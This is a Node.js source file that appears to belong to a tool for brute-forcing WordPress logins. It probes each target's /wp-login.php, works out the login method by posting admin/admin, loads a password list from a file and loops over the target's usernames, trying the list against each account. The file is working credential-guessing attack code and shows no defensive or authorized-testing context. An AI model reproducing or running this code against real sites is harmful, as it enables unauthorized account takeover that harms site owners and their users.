const axios_config = require('./config/axios_config.js');
const chalk = require('chalk');
const fs = require('fs');
const qs = require('qs');
const wp_login = require('./wp_login.js');

const max_users = process.env.MAX_USERS;

const pass_file = process.env.PASS_FILE;
var passwords;

async function bruteForceTarget(target) {
    let url = target.url.replace('http://', 'https://');
    let users = target.users;

    let available = await detectLoginAvailable(url);
    if (!available) {
        console.warn(chalk.yellow(`${url} : WP admin panel is not available`));
        return;
    }

    let method = await detectLoginMethod(url);

    console.info(`${url} : starting bruteforcing...`);
    let u = 0;
    for (let user of users) {
        if (u == max_users) break;

        if (user != '') {
            let login = user.trim();
            if (login.includes('"')) {
                login = login.split('"')[0].trim();
            }
            console.debug(`${url} : bruteforcing ${login} login...`);
            await wp_login.doLogin(url, method, login, passwords);
        }

        u++;
    }
    console.info(`${url} : finished bruteforcing`);
}

async function detectLoginAvailable(url) {
    let client = axios_config.getClient();

    let loginEndpoint = url + '/wp-login.php';

    try {

        let config = {
            method: 'get',
            url: loginEndpoint,
            headers: axios_config.getDetectHeaders()
        };

        const response = await client(config);

        if (response && response.status === 200) {
            return true;
        } else if (response && response.status != 200) {
            return false;
        }

    } catch (error) {
        return false;
    }
}

async function detectLoginMethod(url) {
    let client = axios_config.getClient();

    let loginEndpoint = url + '/wp-login.php';

    let data = qs.stringify({
        'log': 'admin',
        'pwd': 'admin' 
    });

    try {

        let config = {
            method: 'post',
            url: loginEndpoint,
            data: data,
            headers: axios_config.getLoginHeaders()
        };

        const response = await client(config);

        if (response && response.status === 200) {
            return 'post';
        } else if (response && response.status != 200) {
            return 'get';
        }

    } catch (error) {
        return 'get';
    }
}

function loadPassFile() {
    console.debug('Loading password file...');
    passwords = fs.readFileSync(pass_file, 'utf8').toString().split('\n');
}

module.exports.bruteForceTarget = bruteForceTarget;
module.exports.loadPassFile = loadPassFile;
